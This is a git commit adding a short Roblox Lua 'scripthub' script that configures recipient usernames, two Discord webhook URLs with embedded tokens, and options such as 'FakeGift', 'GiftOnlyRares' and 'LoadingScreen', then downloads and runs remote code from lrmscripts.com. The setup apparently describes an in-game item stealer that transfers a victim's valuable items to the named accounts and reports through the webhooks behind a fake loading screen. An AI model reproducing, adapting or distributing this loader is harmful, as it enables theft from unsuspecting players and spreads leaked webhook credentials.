68af8deb018c317f15fc0f7dd9aca0515164b74b
coralbs <lemonshidou@gmail.com>
2025-07-27 12:09:24 +0400

    Upload scripthub-script.lua via Script Source Converter

---
+++ scripthub-script.lua
@@ -0,0 +1,13 @@
+_G.LRMConfig = {
+    User = {"giosixarulid3", "coralbloxian"},
+    min_value = 10000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "https://discord.com/api/webhooks/1398939570468294706/0R5SjAjNwLMWYkrWepHIAbHNywrZ5fJxOV4Xlfd7z1sPsCBB8z2op0HemV9b63wK1Ksj",
+    FakeGift = "No",
+    Trash = "https://discord.com/api/webhooks/1398939577019928657/MIDcxiVYTTwH_52hTihm-CYvO-yFW4MdAZWO5Ymml341XWBORGVDKYk-LqQOrxS8gLkc",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
